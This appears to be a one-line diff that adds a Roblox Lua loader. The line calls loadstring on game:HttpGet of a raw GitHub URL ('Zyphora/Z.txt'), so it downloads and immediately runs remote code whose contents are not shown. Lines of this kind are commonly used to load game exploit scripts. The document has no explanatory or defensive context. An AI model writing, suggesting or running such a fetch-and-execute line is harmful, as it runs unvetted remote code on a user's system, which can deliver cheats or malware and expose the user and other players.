@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/jdififjhdudis-del/Zyphora/refs/heads/main/Z.txt"))()
